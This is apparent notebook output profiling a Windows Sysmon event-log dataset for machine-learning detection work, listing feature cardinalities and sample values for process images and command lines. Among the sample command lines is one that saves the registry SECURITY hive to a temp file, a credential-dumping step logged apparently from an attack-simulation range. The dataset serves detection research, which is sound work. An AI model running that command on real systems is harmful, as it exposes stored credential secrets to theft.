'binary_TargetProcessGuid_4': 3, 'binary_TargetProcessGuid_5': 3, 'binary_TargetProcessGuid_6': 3, 'binary_TargetProcessGuid_7': 3, 'binary_TargetProcessGuid_8': 3, 'binary_TargetProcessGuid_9': 3, 'binary_TargetProcessGuid_10': 3, 'binary_TargetProcessGuid_11': 3, 'binary_TargetProcessGuid_12': 3, 'binary_TargetProcessGuid_13': 3, 'binary_TargetProcessGuid_14': 3, 'binary_TargetProcessGuid_15': 3, 'binary_DestinationHostname_0': 3, 'binary_DestinationHostname_1': 3, 'binary_DestinationHostname_2': 3, 'binary_DestinationHostname_3': 3, 'binary_DestinationHostname_4': 3, 'binary_DestinationHostname_5': 3, 'binary_DestinationHostname_6': 3, 'binary_DestinationHostname_7': 3, 'binary_DestinationHostname_8': 3, 'binary_DestinationHostname_9': 3, 'binary_DestinationHostname_10': 3, 'binary_DestinationHostname_11': 3, 'binary_DestinationHostname_12': 3, 'binary_DestinationHostname_13': 3, 'binary_DestinationHostname_14': 3, 'binary_DestinationHostname_15': 3, 'binary_SourcePortName_0': 3, 'binary_SourcePortName_1': 3, 'binary_SourcePortName_2': 3, 'binary_SourcePortName_3': 3, 'binary_SourcePortName_4': 3, 'binary_SourcePortName_5': 3, 'binary_SourcePortName_6': 3, 'binary_SourcePortName_7': 3, 'binary_SourcePortName_8': 3, 'binary_SourcePortName_9': 3, 'binary_SourcePortName_10': 3, 'binary_SourcePortName_11': 3, 'binary_SourcePortName_12': 3, 'binary_SourcePortName_13': 3, 'binary_SourcePortName_14': 3, 'binary_SourcePortName_15': 3, 'binary_DestinationPortName_0': 3, 'binary_DestinationPortName_1': 3, 'binary_DestinationPortName_2': 3, 'binary_DestinationPortName_3': 3, 'binary_DestinationPortName_4': 3, 'binary_DestinationPortName_5': 3, 'binary_DestinationPortName_6': 3, 'binary_DestinationPortName_7': 3, 'binary_DestinationPortName_8': 3, 'binary_DestinationPortName_9': 3, 'binary_DestinationPortName_10': 3, 'binary_DestinationPortName_11': 3, 'binary_DestinationPortName_12': 3, 'binary_DestinationPortName_13': 3, 'binary_DestinationPortName_14': 3, 'binary_DestinationPortName_15': 3, 'binary_StartAddress_0': 3, 'binary_StartAddress_1': 3, 'binary_StartAddress_2': 3, 'binary_StartAddress_3': 3, 'binary_StartAddress_4': 3, 'binary_StartAddress_5': 3, 'binary_StartAddress_6': 3, 'binary_StartAddress_7': 3, 'binary_StartAddress_8': 3, 'binary_StartAddress_9': 3, 'binary_StartAddress_10': 3, 'binary_StartAddress_11': 3, 'binary_StartAddress_12': 3, 'binary_StartAddress_13': 3, 'binary_StartAddress_14': 3, 'binary_StartAddress_15': 3, 'binary_StartModule_0': 3, 'binary_StartModule_1': 3, 'binary_StartModule_2': 3, 'binary_StartModule_3': 3, 'binary_StartModule_4': 3, 'binary_StartModule_5': 3, 'binary_StartModule_6': 3, 'binary_StartModule_7': 3, 'binary_StartModule_8': 3, 'binary_StartModule_9': 3, 'binary_StartModule_10': 3, 'binary_StartModule_11': 3, 'binary_StartModule_12': 3, 'binary_StartModule_13': 3, 'binary_StartModule_14': 2, 'binary_StartModule_15': 3, 'binary_NewThreadId_0': 3, 'binary_NewThreadId_1': 3, 'binary_NewThreadId_2': 3, 'binary_NewThreadId_3': 3, 'binary_NewThreadId_4': 3, 'binary_NewThreadId_5': 3, 'binary_NewThreadId_6': 3, 'binary_NewThreadId_7': 3, 'binary_NewThreadId_8': 3, 'binary_NewThreadId_9': 3, 'binary_NewThreadId_10': 3, 'binary_NewThreadId_11': 3, 'binary_NewThreadId_12': 3, 'binary_NewThreadId_13': 3, 'binary_NewThreadId_14': 3, 'binary_NewThreadId_15': 3, 'binary_GrantedAccess_0': 3, 'binary_GrantedAccess_1': 3, 'binary_GrantedAccess_2': 3, 'binary_GrantedAccess_3': 3, 'binary_GrantedAccess_4': 3, 'binary_GrantedAccess_5': 3, 'binary_GrantedAccess_6': 3, 'binary_GrantedAccess_7': 3, 'binary_GrantedAccess_8': 3, 'binary_GrantedAccess_9': 3, 'binary_GrantedAccess_10': 3, 'binary_GrantedAccess_11': 3, 'binary_GrantedAccess_12': 3, 'binary_GrantedAccess_13': 3, 'binary_GrantedAccess_14': 3, 'binary_GrantedAccess_15': 3, 'binary_QueryName_0': 3, 'binary_QueryName_1': 3, 'binary_QueryName_2': 3, 'binary_QueryName_3': 3, 'binary_QueryName_4': 3, 'binary_QueryName_5': 3, 'binary_QueryName_6': 3, 'binary_QueryName_7': 3, 'binary_QueryName_8': 3, 'binary_QueryName_9': 3, 'binary_QueryName_10': 3, 'binary_QueryName_11': 3, 'binary_QueryName_12': 3, 'binary_QueryName_13': 3, 'binary_QueryName_14': 3, 'binary_QueryName_15': 3, 'binary_QueryResults_0': 3, 'binary_QueryResults_1': 3, 'binary_QueryResults_2': 3, 'binary_QueryResults_3': 3, 'binary_QueryResults_4': 3, 'binary_QueryResults_5': 3, 'binary_QueryResults_6': 3, 'binary_QueryResults_7': 3, 'binary_QueryResults_8': 3, 'binary_QueryResults_9': 3, 'binary_QueryResults_10': 3, 'binary_QueryResults_11': 3, 'binary_QueryResults_12': 3, 'binary_QueryResults_13': 3, 'binary_QueryResults_14': 3, 'binary_QueryResults_15': 3, 'binary_Hashes_0': 3, 'binary_Hashes_1': 3, 'binary_Hashes_2': 3, 'binary_Hashes_3': 3, 'binary_Hashes_4': 3, 'binary_Hashes_5': 3, 'binary_Hashes_6': 3, 'binary_Hashes_7': 3, 'binary_Hashes_8': 3, 'binary_Hashes_9': 3, 'binary_Hashes_10': 3, 'binary_Hashes_11': 3, 'binary_Hashes_12': 3, 'binary_Hashes_13': 3, 'binary_Hashes_14': 3, 'binary_Hashes_15': 3, 'binary_Hash_0': 3, 'binary_Hash_1': 3, 'binary_Hash_2': 3, 'binary_Hash_3': 3, 'binary_Hash_4': 3, 'binary_Hash_5': 3, 'binary_Hash_6': 3, 'binary_Hash_7': 3, 'binary_Hash_8': 3, 'binary_Hash_9': 3, 'binary_Hash_10': 3, 'binary_Hash_11': 3, 'binary_Hash_12': 3, 'binary_Hash_13': 3, 'binary_Hash_14': 3, 'binary_Hash_15': 3, 'binary_Contents_0': 3, 'binary_Contents_1': 3, 'binary_Contents_2': 3, 'binary_Contents_3': 3, 'binary_Contents_4': 3, 'binary_Contents_5': 3, 'binary_Contents_6': 3, 'binary_Contents_7': 3, 'binary_Contents_8': 3, 'binary_Contents_9': 3, 'binary_Contents_10': 3, 'binary_Contents_11': 3, 'binary_Contents_12': 3, 'binary_Contents_13': 3, 'binary_Contents_14': 3, 'binary_Contents_15': 3, 'SourceIp_binary_0': 2, 'SourceIp_binary_1': 2, 'SourceIp_binary_2': 2, 'SourceIp_binary_3': 2, 'SourceIp_binary_4': 2, 'SourceIp_binary_5': 2, 'SourceIp_binary_6': 2, 'SourceIp_binary_7': 2, 'SourceIp_binary_8': 2, 'SourceIp_binary_9': 2, 'SourceIp_binary_10': 2, 'SourceIp_binary_11': 2, 'SourceIp_binary_12': 2, 'SourceIp_binary_13': 2, 'SourceIp_binary_14': 2, 'SourceIp_binary_15': 2, 'SourceIp_prefix_binary_0': 2, 'SourceIp_prefix_binary_1': 2, 'SourceIp_prefix_binary_2': 2, 'SourceIp_prefix_binary_3': 2, 'SourceIp_prefix_binary_4': 2, 'SourceIp_prefix_binary_5': 2, 'SourceIp_prefix_binary_6': 2, 'SourceIp_prefix_binary_7': 2, 'SourceIp_prefix_binary_8': 2, 'SourceIp_prefix_binary_9': 2, 'SourceIp_prefix_binary_10': 2, 'SourceIp_prefix_binary_11': 2, 'SourceIp_prefix_binary_12': 2, 'SourceIp_prefix_binary_13': 2, 'SourceIp_prefix_binary_14': 2, 'SourceIp_prefix_binary_15': 2, 'DestinationIp_binary_0': 2, 'DestinationIp_binary_1': 2, 'DestinationIp_binary_2': 2, 'DestinationIp_binary_3': 2, 'DestinationIp_binary_4': 2, 'DestinationIp_binary_5': 2, 'DestinationIp_binary_6': 2, 'DestinationIp_binary_7': 2, 'DestinationIp_binary_8': 2, 'DestinationIp_binary_9': 2, 'DestinationIp_binary_10': 2, 'DestinationIp_binary_11': 2, 'DestinationIp_binary_12': 2, 'DestinationIp_binary_13': 2, 'DestinationIp_binary_14': 2, 'DestinationIp_binary_15': 2, 'DestinationIp_prefix_binary_0': 2, 'DestinationIp_prefix_binary_1': 2, 'DestinationIp_prefix_binary_2': 2, 'DestinationIp_prefix_binary_3': 2, 'DestinationIp_prefix_binary_4': 2, 'DestinationIp_prefix_binary_5': 2, 'DestinationIp_prefix_binary_6': 2, 'DestinationIp_prefix_binary_7': 2, 'DestinationIp_prefix_binary_8': 2, 'DestinationIp_prefix_binary_9': 2, 'DestinationIp_prefix_binary_10': 2, 'DestinationIp_prefix_binary_11': 2, 'DestinationIp_prefix_binary_12': 2, 'DestinationIp_prefix_binary_13': 2, 'DestinationIp_prefix_binary_14': 2, 'DestinationIp_prefix_binary_15': 2, 'FileVersion_Part_0_normalized': 43, 'FileVersion_Part_1_normalized': 64, 'FileVersion_Part_2_normalized': 116, 'FileVersion_Part_3_normalized': 158, 'Description_tfidf_0': 6, 'Description_tfidf_1': 5, 'Description_tfidf_2': 6, 'Description_tfidf_3': 6, 'Description_tfidf_4': 8, 'Description_tfidf_5': 5, 'Description_tfidf_6': 8, 'Description_tfidf_7': 10, 'Description_tfidf_8': 14, 'Description_tfidf_9': 10, 'Description_tfidf_10': 7, 'Description_tfidf_11': 12, 'Description_tfidf_12': 7, 'Description_tfidf_13': 10, 'Description_tfidf_14': 10, 'Description_tfidf_15': 15, 'Description_tfidf_16': 16, 'Description_tfidf_17': 24, 'Description_tfidf_18': 7, 'Description_tfidf_19': 8, 'Description_tfidf_20': 12, 'Description_tfidf_21': 16, 'Description_tfidf_22': 7, 'Description_tfidf_23': 10, 'Description_tfidf_24': 8, 'Description_tfidf_25': 7, 'Description_tfidf_26': 7, 'Description_tfidf_27': 10, 'Description_tfidf_28': 8, 'Description_tfidf_29': 9, 'Description_tfidf_30': 6, 'Description_tfidf_31': 8, 'Description_tfidf_32': 8, 'Description_tfidf_33': 7, 'Description_tfidf_34': 8, 'Description_tfidf_35': 12, 'Description_tfidf_36': 12, 'Description_tfidf_37': 7, 'Description_tfidf_38': 9, 'Description_tfidf_39': 12, 'Description_tfidf_40': 7, 'Description_tfidf_41': 7, 'Description_tfidf_42': 8, 'Description_tfidf_43': 22, 'Description_tfidf_44': 8, 'Description_tfidf_45': 16, 'Description_tfidf_46': 13, 'Description_tfidf_47': 11, 'Description_tfidf_48': 8, 'Description_tfidf_49': 14, 'Description_tfidf_50': 7, 'Description_tfidf_51': 8, 'Description_tfidf_52': 7, 'Description_tfidf_53': 9, 'Description_tfidf_54': 7, 'Description_tfidf_55': 10, 'Description_tfidf_56': 10, 'Description_tfidf_57': 8, 'Description_tfidf_58': 8, 'Description_tfidf_59': 8, 'Description_tfidf_60': 9, 'Description_tfidf_61': 7, 'Description_tfidf_62': 7, 'Description_tfidf_63': 16, 'Description_tfidf_64': 7, 'Description_tfidf_65': 7, 'Description_tfidf_66': 7, 'Description_tfidf_67': 8, 'Description_tfidf_68': 8, 'Description_tfidf_69': 6, 'Description_tfidf_70': 7, 'Description_tfidf_71': 20, 'Description_tfidf_72': 11, 'Description_tfidf_73': 9, 'Description_tfidf_74': 6, 'Description_tfidf_75': 8, 'Description_tfidf_76': 10, 'Description_tfidf_77': 6, 'Description_tfidf_78': 6, 'Description_tfidf_79': 38, 'Description_tfidf_80': 6, 'Description_tfidf_81': 7, 'Description_tfidf_82': 10, 'Description_tfidf_83': 6, 'Description_tfidf_84': 7, 'Description_tfidf_85': 9, 'Description_tfidf_86': 14, 'Description_tfidf_87': 6, 'Description_tfidf_88': 8, 'Description_tfidf_89': 8, 'Description_tfidf_90': 10, 'Description_tfidf_91': 10, 'Description_tfidf_92': 7, 'Description_tfidf_93': 12, 'Description_tfidf_94': 7, 'Description_tfidf_95': 9, 'Description_tfidf_96': 20, 'Description_tfidf_97': 7, 'Description_tfidf_98': 25, 'Description_tfidf_99': 8, 'Description_tfidf_100': 10, 'Description_tfidf_101': 9, 'Description_tfidf_102': 8, 'Description_tfidf_103': 7, 'Description_tfidf_104': 8, 'Description_tfidf_105': 7, 'Description_tfidf_106': 10, 'Description_tfidf_107': 9, 'Description_tfidf_108': 9, 'Description_tfidf_109': 14, 'Description_tfidf_110': 8, 'Description_tfidf_111': 31, 'Description_tfidf_112': 24, 'Description_tfidf_113': 7, 'Description_tfidf_114': 7, 'Description_tfidf_115': 9, 'Description_tfidf_116': 7, 'Description_tfidf_117': 8, 'Description_tfidf_118': 7, 'Description_tfidf_119': 7, 'Description_tfidf_120': 8, 'Description_tfidf_121': 12, 'Description_tfidf_122': 12, 'Description_tfidf_123': 10, 'Description_tfidf_124': 14, 'Description_tfidf_125': 8, 'Description_tfidf_126': 9, 'Description_tfidf_127': 8, 'Description_tfidf_128': 9, 'Description_tfidf_129': 7, 'Description_tfidf_130': 10, 'Description_tfidf_131': 10, 'Description_tfidf_132': 16, 'Description_tfidf_133': 7, 'Description_tfidf_134': 8, 'Description_tfidf_135': 10, 'Description_tfidf_136': 10, 'Description_tfidf_137': 8, 'Description_tfidf_138': 11, 'Description_tfidf_139': 9, 'Description_tfidf_140': 9, 'Description_tfidf_141': 11, 'Description_tfidf_142': 23, 'Description_tfidf_143': 18, 'Description_tfidf_144': 7, 'Description_tfidf_145': 9, 'Description_tfidf_146': 47, 'Description_tfidf_147': 13, 'Description_tfidf_148': 17, 'Description_tfidf_149': 9, 'Description_tfidf_150': 49, 'Description_tfidf_151': 14, 'Description_tfidf_152': 8, 'Description_tfidf_153': 9, 'Description_tfidf_154': 6, 'Description_tfidf_155': 7, 'Description_tfidf_156': 7, 'Description_tfidf_157': 12, 'Description_tfidf_158': 6, 'Description_tfidf_159': 6, 'Description_tfidf_160': 7, 'Description_tfidf_161': 9, 'Description_tfidf_162': 10, 'Description_tfidf_163': 9, 'Description_tfidf_164': 7, 'Description_tfidf_165': 7, 'Description_tfidf_166': 10, 'Description_tfidf_167': 15, 'Description_tfidf_168': 10, 'Description_tfidf_169': 6, 'Description_tfidf_170': 7, 'Description_tfidf_171': 9, 'Description_tfidf_172': 9, 'Description_tfidf_173': 8, 'Description_tfidf_174': 8, 'Description_tfidf_175': 7, 'Description_tfidf_176': 11, 'Description_tfidf_177': 7, 'Description_tfidf_178': 7, 'Description_tfidf_179': 10, 'Description_tfidf_180': 8, 'Description_tfidf_181': 9, 'Description_tfidf_182': 7, 'Description_tfidf_183': 9, 'Description_tfidf_184': 9, 'Description_tfidf_185': 7, 'Description_tfidf_186': 7, 'Description_tfidf_187': 7, 'Description_tfidf_188': 11, 'Description_tfidf_189': 19, 'Description_tfidf_190': 9, 'Description_tfidf_191': 7, 'Description_tfidf_192': 7, 'Description_tfidf_193': 9, 'Description_tfidf_194': 38, 'Description_tfidf_195': 12, 'Description_tfidf_196': 11, 'Description_tfidf_197': 7, 'Product_tfidf_0': 7, 'Product_tfidf_1': 7, 'Product_tfidf_2': 7, 'Product_tfidf_3': 6, 'Product_tfidf_4': 7, 'Product_tfidf_5': 8, 'Product_tfidf_6': 10, 'Product_tfidf_7': 7, 'Product_tfidf_8': 7, 'Product_tfidf_9': 7, 'Product_tfidf_10': 10, 'Product_tfidf_11': 9, 'Product_tfidf_12': 8, 'Product_tfidf_13': 6, 'Product_tfidf_14': 7, 'Product_tfidf_15': 6, 'Product_tfidf_16': 7, 'Product_tfidf_17': 9, 'Product_tfidf_18': 7, 'Product_tfidf_19': 8, 'Product_tfidf_20': 8, 'Product_tfidf_21': 19, 'Product_tfidf_22': 22, 'Product_tfidf_23': 10, 'Product_tfidf_24': 7, 'Product_tfidf_25': 10, 'Product_tfidf_26': 8, 'Product_tfidf_27': 10, 'Company_tfidf_0': 7, 'Company_tfidf_1': 6, 'Company_tfidf_2': 7, 'Company_tfidf_3': 7, 'Company_tfidf_4': 6, 'Company_tfidf_5': 7, 'Company_tfidf_6': 7, 'Company_tfidf_7': 8, 'Company_tfidf_8': 8, 'Company_tfidf_9': 8, 'Company_tfidf_10': 9, 'Company_tfidf_11': 7, 'EventID_binary_0': 3, 'EventID_binary_1': 3, 'EventID_binary_2': 3, 'EventID_binary_3': 3, 'EventID_binary_4': 3, 'EventID_binary_5': 3, 'EventID_binary_6': 3, 'EventID_binary_7': 3, 'EventID_binary_8': 3, 'EventID_binary_9': 3, 'EventID_binary_10': 3, 'EventID_binary_11': 3, 'EventID_binary_12': 3, 'EventID_binary_13': 3, 'EventID_binary_14': 3, 'EventID_binary_15': 3, 'ProcessID_binary_0': 3, 'ProcessID_binary_1': 3, 'ProcessID_binary_2': 3, 'ProcessID_binary_3': 3, 'ProcessID_binary_4': 3, 'ProcessID_binary_5': 3, 'ProcessID_binary_6': 3, 'ProcessID_binary_7': 3, 'ProcessID_binary_8': 3, 'ProcessID_binary_9': 3, 'ProcessID_binary_10': 3, 'ProcessID_binary_11': 3, 'ProcessID_binary_12': 3, 'ProcessID_binary_13': 3, 'ProcessID_binary_14': 3, 'ProcessID_binary_15': 3, 'Execution_ProcessID_binary_0': 3, 'Execution_ProcessID_binary_1': 3, 'Execution_ProcessID_binary_2': 3, 'Execution_ProcessID_binary_3': 3, 'Execution_ProcessID_binary_4': 3, 'Execution_ProcessID_binary_5': 3, 'Execution_ProcessID_binary_6': 3, 'Execution_ProcessID_binary_7': 3, 'Execution_ProcessID_binary_8': 3, 'Execution_ProcessID_binary_9': 3, 'Execution_ProcessID_binary_10': 3, 'Execution_ProcessID_binary_11': 3, 'Execution_ProcessID_binary_12': 3, 'Execution_ProcessID_binary_13': 3, 'Execution_ProcessID_binary_14': 3, 'Execution_ProcessID_binary_15': 3, 'ParentProcessId_binary_0': 3, 'ParentProcessId_binary_1': 3, 'ParentProcessId_binary_2': 3, 'ParentProcessId_binary_3': 3, 'ParentProcessId_binary_4': 3, 'ParentProcessId_binary_5': 3, 'ParentProcessId_binary_6': 3, 'ParentProcessId_binary_7': 3, 'ParentProcessId_binary_8': 3, 'ParentProcessId_binary_9': 3, 'ParentProcessId_binary_10': 3, 'ParentProcessId_binary_11': 3, 'ParentProcessId_binary_12': 3, 'ParentProcessId_binary_13': 3, 'ParentProcessId_binary_14': 3, 'ParentProcessId_binary_15': 3, 'TargetProcessId_binary_0': 3, 'TargetProcessId_binary_1': 3, 'TargetProcessId_binary_2': 3, 'TargetProcessId_binary_3': 3, 'TargetProcessId_binary_4': 3, 'TargetProcessId_binary_5': 3, 'TargetProcessId_binary_6': 3, 'TargetProcessId_binary_7': 3, 'TargetProcessId_binary_8': 3, 'TargetProcessId_binary_9': 3, 'TargetProcessId_binary_10': 3, 'TargetProcessId_binary_11': 3, 'TargetProcessId_binary_12': 3, 'TargetProcessId_binary_13': 3, 'TargetProcessId_binary_14': 3, 'TargetProcessId_binary_15': 3, 'EventRecordID_binary_0': 3, 'EventRecordID_binary_1': 3, 'EventRecordID_binary_2': 3, 'EventRecordID_binary_3': 3, 'EventRecordID_binary_4': 3, 'EventRecordID_binary_5': 3, 'EventRecordID_binary_6': 3, 'EventRecordID_binary_7': 3, 'EventRecordID_binary_8': 3, 'EventRecordID_binary_9': 3, 'EventRecordID_binary_10': 3, 'EventRecordID_binary_11': 3, 'EventRecordID_binary_12': 3, 'EventRecordID_binary_13': 3, 'EventRecordID_binary_14': 3, 'EventRecordID_binary_15': 3, 'SourcePort_binary_0': 3, 'SourcePort_binary_1': 3, 'SourcePort_binary_2': 3, 'SourcePort_binary_3': 3, 'SourcePort_binary_4': 3, 'SourcePort_binary_5': 3, 'SourcePort_binary_6': 3, 'SourcePort_binary_7': 3, 'SourcePort_binary_8': 3, 'SourcePort_binary_9': 3, 'SourcePort_binary_10': 3, 'SourcePort_binary_11': 3, 'SourcePort_binary_12': 3, 'SourcePort_binary_13': 3, 'SourcePort_binary_14': 3, 'SourcePort_binary_15': 3, 'DestinationPort_binary_0': 3, 'DestinationPort_binary_1': 3, 'DestinationPort_binary_2': 3, 'DestinationPort_binary_3': 3, 'DestinationPort_binary_4': 3, 'DestinationPort_binary_5': 3, 'DestinationPort_binary_6': 3, 'DestinationPort_binary_7': 3, 'DestinationPort_binary_8': 3, 'DestinationPort_binary_9': 3, 'DestinationPort_binary_10': 3, 'DestinationPort_binary_11': 3, 'DestinationPort_binary_12': 3, 'DestinationPort_binary_13': 3, 'DestinationPort_binary_14': 3, 'DestinationPort_binary_15': 3, 'ProcessId_binary_0': 3, 'ProcessId_binary_1': 3, 'ProcessId_binary_2': 3, 'ProcessId_binary_3': 3, 'ProcessId_binary_4': 3, 'ProcessId_binary_5': 3, 'ProcessId_binary_6': 3, 'ProcessId_binary_7': 3, 'ProcessId_binary_8': 3, 'ProcessId_binary_9': 3, 'ProcessId_binary_10': 3, 'ProcessId_binary_11': 3, 'ProcessId_binary_12': 3, 'ProcessId_binary_13': 3, 'ProcessId_binary_14': 3, 'ProcessId_binary_15': 3, 'Description_tfidf_198': 12, 'Description_tfidf_199': 6, 'Description_tfidf_200': 7, 'Description_tfidf_201': 6, 'Description_tfidf_202': 6, 'Description_tfidf_203': 6, 'Description_tfidf_204': 6, 'Description_tfidf_205': 6, 'Description_tfidf_206': 7, 'Description_tfidf_207': 8, 'Description_tfidf_208': 7, 'Description_tfidf_209': 6, 'Description_tfidf_210': 10, 'Description_tfidf_211': 6, 'Description_tfidf_212': 6, 'Description_tfidf_213': 6, 'Description_tfidf_214': 6, 'Description_tfidf_215': 6, 'Description_tfidf_216': 11, 'Description_tfidf_217': 6, 'Description_tfidf_218': 14, 'Description_tfidf_219': 8, 'Description_tfidf_220': 8, 'Description_tfidf_221': 17, 'Description_tfidf_222': 27, 'Description_tfidf_223': 23, 'Description_tfidf_224': 8, 'Description_tfidf_225': 7, 'Description_tfidf_226': 8, 'Description_tfidf_227': 10, 'Description_tfidf_228': 10, 'Description_tfidf_229': 6, 'Description_tfidf_230': 6, 'Description_tfidf_231': 7, 'Description_tfidf_232': 6, 'Description_tfidf_233': 6, 'Description_tfidf_234': 9, 'Description_tfidf_235': 6, 'Description_tfidf_236': 6, 'Description_tfidf_237': 6, 'Description_tfidf_238': 6, 'Description_tfidf_239': 8, 'Description_tfidf_240': 6, 'Description_tfidf_241': 7, 'Description_tfidf_242': 7, 'Description_tfidf_243': 6, 'Description_tfidf_244': 7, 'Description_tfidf_245': 6, 'Description_tfidf_246': 7, 'Description_tfidf_247': 6, 'Description_tfidf_248': 9, 'Description_tfidf_249': 6, 'Description_tfidf_250': 8, 'Description_tfidf_251': 6, 'Description_tfidf_252': 9, 'Description_tfidf_253': 7, 'Description_tfidf_254': 8, 'Description_tfidf_255': 15, 'Description_tfidf_256': 9, 'Description_tfidf_257': 13, 'Description_tfidf_258': 8, 'Description_tfidf_259': 7, 'Description_tfidf_260': 8, 'Description_tfidf_261': 6, 'Description_tfidf_262': 10, 'Description_tfidf_263': 20, 'Description_tfidf_264': 6, 'Description_tfidf_265': 6, 'Description_tfidf_266': 9, 'Description_tfidf_267': 8, 'Description_tfidf_268': 16, 'Description_tfidf_269': 6, 'Description_tfidf_270': 15, 'Description_tfidf_271': 6, 'Description_tfidf_272': 14, 'Description_tfidf_273': 6, 'Description_tfidf_274': 8, 'Description_tfidf_275': 5, 'Description_tfidf_276': 18, 'Description_tfidf_277': 6, 'Description_tfidf_278': 6, 'Description_tfidf_279': 23, 'Description_tfidf_280': 6, 'Description_tfidf_281': 6, 'Description_tfidf_282': 11, 'Description_tfidf_283': 6, 'Description_tfidf_284': 6, 'Description_tfidf_285': 9, 'Description_tfidf_286': 6, 'Description_tfidf_287': 8, 'Description_tfidf_288': 59, 'Description_tfidf_289': 44, 'Description_tfidf_290': 7, 'Description_tfidf_291': 7, 'Description_tfidf_292': 6, 'Description_tfidf_293': 10, 'Description_tfidf_294': 6, 'Description_tfidf_295': 8, 'Description_tfidf_296': 6, 'Description_tfidf_297': 6, 'Description_tfidf_298': 6, 'Description_tfidf_299': 6, 'Product_tfidf_28': 6, 'Product_tfidf_29': 7, 'Product_tfidf_30': 6, 'Product_tfidf_31': 6, 'Product_tfidf_32': 6, 'Product_tfidf_33': 6, 'Product_tfidf_34': 6, 'Product_tfidf_35': 7, 'Product_tfidf_36': 7, 'Product_tfidf_37': 6, 'Product_tfidf_38': 6, 'Product_tfidf_39': 6, 'Product_tfidf_40': 7, 'Product_tfidf_41': 7, 'Product_tfidf_42': 6, 'Product_tfidf_43': 5, 'Product_tfidf_44': 7, 'Product_tfidf_45': 8, 'Product_tfidf_46': 6, 'Product_tfidf_47': 9, 'Product_tfidf_48': 7, 'Product_tfidf_49': 7, 'Product_tfidf_50': 6, 'Product_tfidf_51': 6, 'Product_tfidf_52': 6, 'Product_tfidf_53': 6, 'Product_tfidf_54': 5, 'Product_tfidf_55': 7, 'Product_tfidf_56': 9, 'Product_tfidf_57': 7, 'Product_tfidf_58': 6, 'Product_tfidf_59': 9, 'Product_tfidf_60': 7, 'Company_tfidf_12': 6, 'Company_tfidf_13': 6, 'Company_tfidf_14': 7, 'Company_tfidf_15': 8, 'Company_tfidf_16': 7, 'Company_tfidf_17': 6, 'Company_tfidf_18': 6, 'Company_tfidf_19': 7, 'Company_tfidf_20': 6, 'Company_tfidf_21': 6, 'Company_tfidf_22': 6, 'Unnamed: 0': 1901979, 'Product_tfidf_61': 5, 'Product_tfidf_62': 5, 'Product_tfidf_63': 5, 'Company_tfidf_23': 5, 'Company_tfidf_24': 6, 'Company_tfidf_25': 5, 'Company_tfidf_26': 5, 'Company_tfidf_27': 6, 'Company_tfidf_28': 5, 'Company_tfidf_29': 5, 'Company_tfidf_30': 5, 'Company_tfidf_31': 6}\n",
      "\n",
      "First 10 Unique Values: {'SystemTime': ['0.9948422178458712', '0.0009345772664346', '0.0952871207955468', '0.6948320671763213', '0.0232595332126948', '0.9979226833501116', '0.2298542670396273', '0.0804845867805852', '0.8262988182941626', '0.5997800329969323'], 'UtcTime': ['0.8179898883271292', '0.5001666759264404', '0.0183075897321924', '0.8618850523625655', '0.555280848936052', '0.4160393344259562', '0.3821045613645202', '0.701400077782099', '0.2455881944251451', '0.5663925773654092'], 'Image': ['c: users chrsm appdata local temp is-f516m tmp foxit pdfreader setup tmp', 'c: windows system32 srtasks exe', 'c: windows syswow64 mmc exe', 'c: windows system32 disksnapshot exe', 'c: windows system32 taskkill exe', 'c: tools processexplorer procexp64 exe', 'c: program files windowsapps microsoft yourphone_1 22102 229 0_x64__8wekyb3d8bbwe phoneexperiencehost exe', 'c: users altinitat stefania appdata local microsoft onedrive 22 232 1106 0002 filesyncconfig exe', 'c: windows system32 wbem wmiadap exe', 'c: program files (x86) microsoft edgeupdate install {b1ad1de6-d9e7-4d2b-9869-bc7002539feb} edgemitmp_25175 tmp setup exe'], 'CommandLine': ['cmd exe  c \"reg exe save hklm security c: windows temp paahgrlzp\"', '\"c: program files (x86) microsoft edge application msedge exe\" --type=utility --utility-sub-type=storage mojom storageservice --lang=en-us --service-sandbox-type=utility --mojo-platform-channel-handle=2500 --field-trial-handle=1872,i,2222059548206292211,6648449513146549123,131072  prefetch:8', '\"c: program files (x86) microsoft edge application msedge exe\" --type=utility --utility-sub-type=unzip mojom unzipper --lang=en-us --service-sandbox-type=service --mojo-platform-channel-handle=8044 --field-trial-handle=2120,i,11514816967861694043,2397135569800938562,131072  prefetch:8', '\"c: program files (x86) microsoft edge application msedge exe\" --type=utility --utility-sub-type=data_decoder mojom datadecoderservice --lang=en-us --service-sandbox-type=service --mojo-platform-channel-handle=6936 --field-trial-handle=2200,i,11306265943622648430,17306781604245324437,131072  prefetch:8', \"powershell exe -executionpolicy restricted -command write-host 'final result: 1';\", '\"c: program files (x86) microsoft edge application msedge exe\" --type=renderer --display-capture-permissions-policy-allowed --js-flags=--ms-user-locale= --disable-gpu-compositing --lang=en-us --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=34 --time-ticks-at-unix-epoch=-1670250280891976 --launch-time-ticks=6207602935 --mojo-platform-channel-handle=6860 --field-trial-handle=2116,i,3288304450214820399,16031686530847943826,131072  prefetch:1', '\"c: program files (x86) microsoft edge application msedge exe\" --type=renderer --instant-process --display-capture-permissions-policy-allowed --js-flags=--ms-user-locale= --disable-gpu-compositing --lang=en-us --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=135 --time-ticks-at-unix-epoch=-1669828275133951 --launch-time-ticks=6988843275 --mojo-platform-channel-handle=4584 --field-trial-handle=2044,i,1413821435695755471,16507231761416659504,131072  prefetch:1', '\"c: program files (x86) microsoft edgeupdate install {1daac6b3-5392-43ad-8306-9398233f5504} microsoftedge_x64_107 0 1418 62_107 0 1418 56 exe\" --msedge --verbose-logging --do-not-launch-msedge --system-level --channel=stable', 'consent exe 52 534 0000020cf2afc700', '\"c: program files (x86) microsoft edge application msedge exe\" --type=renderer --disable-gpu-compositing --lang=en-us --js-flags=--ms-user-locale= --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=39 --time-ticks-at-unix-epoch=-1670426473124656 --launch-time-ticks=27373091657 --mojo-platform-channel-handle=3960 --field-trial-handle=2096,i,16567553602575800627,5760818214266078785,131072  prefetch:1'], 'CurrentDirectory': ['c: users altini~1 ste appdata local temp eua53e tmp', 'z:', 'c: windows', 'c: windows systemapps microsoft windows search_cw5n1h2txyewy', 'c: program files (x86) microsoft edge application 108 0 1462 54', 'c:', 'c: users administrator attackrange', 'c: windows temp', 'c: program files (x86) microsoft edge application 108 0 1462 42', 'c: windows systemapps shellexperiencehost_cw5n1h2txyewy'], 'ParentImage': ['c: windows system32 wevtutil exe', 'c: program files (x86) microsoft edgeupdate install 